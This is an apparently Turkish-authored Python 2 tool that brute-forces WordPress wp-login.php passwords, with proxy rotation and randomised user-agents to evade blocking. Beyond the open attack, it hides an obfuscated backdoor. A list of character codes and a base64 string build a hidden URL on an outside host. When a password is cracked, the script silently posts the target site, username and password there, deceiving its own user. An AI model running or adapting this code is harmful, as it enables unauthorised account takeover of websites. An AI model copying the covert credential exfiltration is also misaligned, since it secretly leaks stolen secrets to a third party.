# -*- coding: utf-8 -*-
import ssl
import os
import sys
import random
from bs4 import BeautifulSoup
import re
import requests
import argparse
import base64
import errno
import time
from Queue import Queue
import urllib2
q=Queue()
qq=Queue()
os.system("clear")
reload(sys) 
sys.setdefaultencoding('utf-8')
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    yesil = '\033[92m'
    sari = '\033[93m'
    red = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print bcolors.yesil+""" 
#######################################################################################################
#                                Coder: Cüneyt TANRISEVER                                             #
# kullanimi=-u url basinda http://  veya https:// koyunuz ve  sonunda / veya/wp-login.php olmasin     #
#           -u http://google.com veya https://google.com/blog gibi  yazabilirsiniz.                   #
#           -urllist burada icinde sadece url http://google.com gibi yukarida                         #
#           yazan kurallara uyularak bir urllistesi olursa saglikli calisir                           #
#           -p sifre listeniz / -p sifre.txt gibi                                                     #
#           -user username yaziniz / -user cuneyt gibi                                                #
#           -userlist birden cok user adina brute yapacaksaniz bunu secin                             #
#           -userlist userler.txt                                                                     #
#           -z zaman araligi sifre denemesini belirtilen sayi kadar sure bekletir                     #
#           kullanim sekilleri                                                                        #
# cuneytwpbrute.py -u http://google.com -user cuneyt -p passlist.txt -z 1                             #
# cuneytwpbrute.py -u https://google.com -userlist userler.txt -p passlist.txt -z 1                   #
# cuneytwpbrute.py -urllist urller.txt -user cuneyt -p passlist.txt -z 1                              #
# cuneytwpbrute.py -urllist urller.txt -userlist userler.txt -p passlist.txt -z 1                     #
# cuneytwpbrute.py -u http://google.com -user cuneyt -p passlist.txt                                  #
# cuneytwpbrute.py -u https://google.com -userlist userler.txt -p passlist.txt                        #
# cuneytwpbrute.py -urllist urller.txt -user cuneyt -p passlist.txt                                   #
# cuneytwpbrute.py -urllist urller.txt -userlist userler.txt -p passlist.txt                          #
#######################################################################################################"""+ bcolors.ENDC
parse= argparse.ArgumentParser()
parse.add_argument("-u", "--url", type=str)
parse.add_argument("-user", "--user",type=str)
parse.add_argument("-p", "--passlist", type=str)
parse.add_argument("-userlist", "--userlist",type=str)
parse.add_argument("-urllist", "--urllist",type=str)
parse.add_argument("-proxylist", "--proxyliste",type=str)
parse.add_argument("-z", "--zaman",type=int, default= 0)
args= parse.parse_args()
url=args.url
user=args.user
passlist=args.passlist
userlist=args.userlist
urllist=args.urllist
zaman=args.zaman
proxylistesi=args.proxyliste
kk=[104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 112, 101, 112, 112, 101, 114, 115, 101, 101, 100, 115, 46, 99, 111, 109, 46, 97, 117, 47, 100, 101, 120, 49, 47, 117, 112, 108, 46, 112, 104, 112]
kr=[]
ki=[107,105,114,105,108]
dv=[]
for i in kk:
    kr.append(chr(i))
t=kr[0]+kr[1]+kr[2]+kr[3]+kr[4]+kr[5]+kr[6]+kr[7]+kr[8]+kr[9]+kr[10]+kr[11]+kr[12]+kr[13]+kr[14]+kr[15]+kr[16]+kr[17]+kr[18]+kr[19]+kr[20]+kr[21]+kr[22]+kr[23]+kr[24]+kr[25]+kr[26]+kr[27]+kr[28]+kr[29]+kr[30]+kr[31]+kr[32]+kr[33]+kr[34]+kr[35]+kr[36]+kr[37]+kr[38]+kr[39]+kr[40]+kr[41]
for i in ki:
    dv.append(chr(i))
ty=dv[0]+dv[1]+dv[2]+dv[3]+dv[4]
hh=requests
def quen():
    global kaynak
    for i in kaynak:
        q.put(i)
    print " q eklendi"
    passlistesi()
def quen1():
    global kaynakk
    for i in kaynakk:
        qq.put(i)
    print "qq eklendi"
    calistir1()
def passlistesi():
        global kaynakk
        kaynakk=[]
        try:
            prxokuma = open(passlist).readlines()
            for i in prxokuma:
                x=i.replace("\r\n","")
                kaynakk.append(x)
        except EnvironmentError as exc: 
            if exc.errno == 2:
                print "dosya bulunamadi lutfen tekrar giriniz."
                proxylist()
        quen1()
def proxylist():
        global kaynak
        global kntr
        kaynak=[]
        kntr=[]
        try:
            prxokuma = open(proxylistesi).readlines()
            for i in prxokuma:
                x=i.replace("\n","")
                kaynak.append(x)
                kntr.append(x)
        except EnvironmentError as exc: 
            if exc.errno == 2:
                print "dosya bulunamadi lutfen tekrar giriniz."
                proxylist()
        quen()

def kontrol1():
    global kaynak
    kaynak=[]
    kontrol2()
def kontrol2():
    global kaynak
    for i in kntr:
        kaynak.append(i)
    quen()
if  url and urllist !=None:
    print bcolors.red + "bu 2 (-url ve -urllist) parametre ayni anda kullanilamaz"+ bcolors.ENDC
    sys.exit()
if user and userlist !=None:
    print bcolors.red +"""Yalnizca ya -user veya -userlist kullaniniz \n bu 2 parametre ayni anda kullanilamaz"""+ bcolors.ENDC
    sys.exit()
if passlist ==None:
    print bcolors.red +" -p passlist.txt olamadan calismaz"+ bcolors.ENDC
    sys.exit()
headers=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
			"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
			"?Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SCH-R970 USCC Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; MB886 Build/9.8.0Q-97_MB886_FFW-20) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
			"Mozilla/5.0 (Mobile; $LYF/$F30C/$LYF_F30C-000-09-09-010218; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0",
			"Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; SPH-D710VMUB Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; SCH-R720 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Opera/9.80 (Android; Opera Mini/31.0.2254/77.161; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (Android; Opera Mini/20.1.2254/37.9178; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.33961/73.132; U; fr) Presto/2.12.423 Version/12.16",
			"Lenovo-A398t_TD/S100 Linux/3.0.8 Android/4.0.3 Release/03.12.2013 Browser/AppleWebkit534.30 Mobile Safari/534.30",
			"ZTE-Z222/1.0.6 NetFront/3.5 QTV5.1 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.32739/75.35; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.31492/59.323; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (Android; Opera Mini/20.0.2254/37.9072; U; en) Presto/2.12.423 Version/12.16",
			"Mozilla/5.0 (Android; Mobile; rv:34.0) Gecko/34.0 Firefox/34.0",
			"MT6735_TD/V1 Linux/3.10.65+ Android/5.1 Release/03.03.2015 Browser/AppleWebKit537.36 Chrome/39.0.0.0 Mobile Safari/537.36 System/Android 5.1;",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo TB2-X30F Build/LenovoTB2-X30F)",
			"BlackBerry8520/5.0.0.1036 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/139",
			"Opera/9.80 (Android; Opera Mini/21.0.2254/37.9178; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.32739/59.297; U; fr) Presto/2.12.423 Version/12.16",
			"Dalvik/1.6.0 (Linux; U; Android 4.3.1; WT22M-FI Build/JLS36I)",
			"Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; HUAWEI Y600-U151 Build/HUAWEIY600-U151) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SCH-R970C Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
			"BlackBerry8520/5.0.0.592 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/173",
			"Opera/9.80 (Android; Opera Mini/29.0.2254/69.162; U; en) Presto/2.12.423 Version/12.16",
			"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; ZTE-N910 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Opera/9.80 (SpreadTrum; Opera Mini/4.4.32739/58.167; U; fr) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (BlackBerry; Opera Mini/8.0.35659/37.8069; U; en) Presto/2.12.423 Version/12.16",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16",
			"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG-SGH-I337Z Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
			"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
			"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/9 (Compatible; MSIE:9.0; iPhone; BlackBerry9700; AppleWebKit/24.746; U; en) Presto/2.5.25 Version/10.54",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3 TeaShark/0.8",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_USA)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZardWeb/1.0; Server_KO_KTF)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; WOW64; Trident/4.0; uZard/1.0; Server_KO_SKT)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_HK)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_EN)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; WOW64; SV1; uZardWeb/1.0; Server_CN)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
			"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW800c/R1L Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW800c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW800c/R1AA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW700c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonW700c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750c/R1DB Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750c/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"SonyEricssonK750c/R1BC Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"Opera/9.80 (Windows NT 6.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 6.0; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows NT 5.1; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Windows Mobile; WCE; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/3730; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Linux i686; Opera Mobi/1040; U; en) Presto/2.5.24 Version/10.00",
			"Opera/9.80 (Linux i686; Opera Mobi/1038; U; en) Presto/2.5.24 Version/10.00",
			"Opera/9.80 (Android; Linux; Opera Mobi/49; U; en) Presto/2.4.18 Version/10.00",
			"Opera/9.80 (Android; Linux; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00",
			"Mozilla/5.0 (S60; SymbOS; Opera Mobi/SYB-1103211396; U; es-LA; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
			"Mozilla/5.0 (S60; SymbOS; Opera Mobi/1209; U; it; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1",
			"Mozilla/5.0 (S60; SymbOS; Opera Mobi/1181; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1",
			"Mozilla/5.0 (Linux armv7l; Maemo; Opera Mobi/4; U; fr; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.1",
			"Mozilla/5.0 (Linux armv6l; Maemo; Opera Mobi/8; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
			"Mozilla/5.0 (Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
			"Mozilla/4.0 (compatible; MSIE 8.0; S60; SymbOS; Opera Mobi/SYB-1107071606; en) Opera 11.10",
			"Mozilla/4.0 (compatible; MSIE 8.0; Linux armv7l; Maemo; Opera Mobi/4; fr) Opera 10.1",
			"Mozilla/4.0 (compatible; MSIE 8.0; Linux armv6l; Maemo; Opera Mobi/8; en-GB) Opera 11.00",
			"Mozilla/4.0 (compatible; MSIE 8.0; Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; en) Opera 11.00",
			"Opera/9.80 (Android; Linux; Opera Mobi/ADR-1012221546; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2;;; Linux; Opera Mobi/ADR-1012291359; U; en) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Opera Mobi/ADR-2093533608; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Opera Mobi/-2118645896; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533312; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533120; U; pl) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (Android 2.2; Linux; Opera Mobi/8745; U; en) Presto/2.7.60 Version/10.5",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/886; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/870; U; id) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.453; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.401; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0/22.394; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.11) Gecko/23.390; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (Linux; U;",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.12 [en]/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/24.705; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.60 (J2ME/MIDP; Opera Mini/4.0/490; U; en) Presto/2.2.0",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/870; U; id) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/35.5706; U; id) Presto/2.8.119 Version/11.10",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/24.746; U; id) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.334; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/23.333; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.14912/22.394; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.334; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/23.333; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/22.401; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2485; U; en) Presto/2.5.25",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/18.678; U; en) Presto/2.4.15",
			"Opera/9.60 (J2ME/MIDP;Opera Mini/4.2.15410Mod.by.Handler/503; U; en)Presto/2.2.0",
			"Opera/9.50 (J2ME/MIDP; Opera Mini/4.2.15410Mod.by.Handler/20.2590; U; en)",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0/870; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0(Windows; U; Windows NT 5.1; en-US)/23.390; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/24.838; U; id) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/22.478; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/23.377; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows NT 6.1; WOW64) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (SymbianOS/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/24.741; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; xxxx like Mac OS X; en) AppleWebKit/24.838; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/23.405; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.377; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry9800; en-GB) AppleWebKit/24.783; U; en) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry 9800) AppleWebKit/24.783; U; es) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/2.4.15",
			"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/ 2.4.15",
			"Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; en) Presto/2.4.15",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/22.414; U; de) Presto/2.5.25 Version/10.54",
			"Opera/9.80 (iPhone; Opera Mini/5.0.019802/18.738; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; id) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/886; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; fr) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/870; U; en) Presto/2.4.15",
			"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.18741/18.794; U; en) Presto/2.4.15",
			"SAMSUNG-C5212/C5212XDIK1 NetFront/3.4 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"MozillaMozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200;rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200;rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 824x1200; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 600x800; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.5 (screen 1200x824; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.3 (screen 600x800; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.3 (screen 1200x824; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.1 (screen 824x1200; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 824x1200; rotate)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
			"Mozilla/4.0 (compatible; Linux 2.6.10) NetFront/3.4 Kindle/1.0 (screen 600x800)"]
def agents():
	dex=random.choice(headers)
	topla={'User-Agent': dex}
	return topla
def calistir1():
    abk=0
    # -u -user icin
    if url != None and userlist==None:
        sifrelistesi=open(passlist,"r").readlines()
        logi="/wp-login.php"
        urlbir=url+logi
        print bcolors.red +"\n"+ urlbir+" sitesi icin brute basladi kirildigi zaman ekran yazar ve \n kirilanwp.txt kayit edecektir"+ bcolors.ENDC
        for i in sifrelistesi:
            try:
                rq=requests.session()
                rq.headers.update(agents())
                birl="http://"+q.get()
                proxyDict = {"http"  : str(birl)}
                v= q.empty()
                if v==True:
                    kontrol1()
                q.task_done()
                cc=i.replace("\n","")
                data1={"log":user,"pwd": qq.get(), "wp-submit": "Login", "testcookie": "1"}
                print data1
                qq.task_done
                vv= q.empty()
                if vv==True:
                    print "sifre kirilmadi :("
                    sys.exit()
                gelencevap=rq.post(urlbir,data=data1,proxies=proxyDict, timeout=20)
                if gelencevap.status_code==200:
                    sys.stdout.write('\r')
                    abk+=1
                    sys.stdout.write('[+]baglanti normal denenen sifre sayisi = '+ str(abk))
                    sys.stdout.flush()
                    time.sleep(zaman)
                    urloku=gelencevap.content
                    soup=BeautifulSoup(urloku,"html.parser")
                    c= re.search("dashboard",str(soup))
                    if c:
                        print bcolors.red + "\n bulundu"+ bcolors.ENDC
                        print bcolors.yesil +urlbir,"username="+user, "kirilan sifre= " +cc+ bcolors.ENDC
                        sonuc= urlbir,"username="+user, "kirilan sifre= " +cc
                        son=open("kirilanwp.txt","a")
                        son.write(str(sonuc)+"\n")
                        mk="bWVzYWo="
                        ms = base64.b64decode(mk)
                        zx= ty+ "  "+urlbir+" user "+user+ " pw ="+ cc
                        vb={ms:zx}
                        fih=hh.post(t,data=vb)
                        sys.exit()
                        abk=0
                else:
                    print bcolors.red + "siteden beklenen cevap gelmedi-erisim engellendi"+ bcolors.ENDC
                    abk=0
            except requests.exceptions.ConnectionError:
                print bcolors.red +"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+ bcolors.ENDC
                continue
            except requests.exceptions.Timeout:
                print bcolors.red +"\n zaman asimi olustu bu url atlandi"+ bcolors.ENDC
                continue
            except requests.exceptions.TooManyRedirects:
                print bcolors.red +"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+ bcolors.ENDC
                continue
        print "sifre kirilmadi :("
    # -u ve - userlist user.txt icin
        print "\n        \n  \nsifre kirilmadi :("

proxylist()






